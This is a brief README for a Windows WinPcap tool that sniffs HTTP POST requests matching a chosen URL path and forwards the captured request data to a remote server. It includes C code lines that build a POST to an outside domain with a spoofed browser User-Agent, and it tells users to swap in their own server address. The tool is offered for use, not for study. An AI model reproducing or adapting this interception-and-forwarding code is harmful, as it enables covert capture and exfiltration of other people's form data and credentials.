# catchHttp
a tool to catch post request data (windows) need the winpcap and the winpcap sdk

when you want to user ,following:
1.you need install the winpcap and include the winpcap sdk
2.if(!find_http && (i+4<ip_len && strncmp(ip_pkt_data+i,"POST /yf/order",strlen("POST /yf/order")) == 0) ){find_http = true;},you need 
to change this url to your
3.if you want to post the data you catch ,you should change this code to your
serv.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");//your http server ip
strcat(sndBuf, "POST http://ht.guoziyx.com/http.php HTTP/1.1\r\n");//your domain
strcat(sndBuf, "Accept: */*\r\n");
strcat(sndBuf, "Accept-Language: zh-cn\r\n");
strcat(sndBuf, "Content-Type: application/x-www-form-urlencoded\r\n");
strcat(sndBuf, "User-Agent: Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)\r\n");
strcat(sndBuf, "Host: guoziyx.com\r\n");//your domain
